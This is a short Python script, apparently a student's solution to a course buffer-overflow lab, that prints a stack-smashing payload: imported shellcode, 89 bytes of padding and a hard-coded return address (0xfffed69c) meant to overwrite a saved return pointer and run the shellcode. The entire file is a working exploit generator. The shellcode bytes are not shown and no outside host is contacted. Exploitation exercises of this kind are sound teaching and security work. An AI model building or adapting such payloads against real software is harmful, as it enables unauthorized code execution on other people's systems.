#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

pad = 22*4+1
# 0xfffed69c
addr = b'\x9c\xd6\xfe\xff'
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xaa'*pad)
sys.stdout.buffer.write(addr)
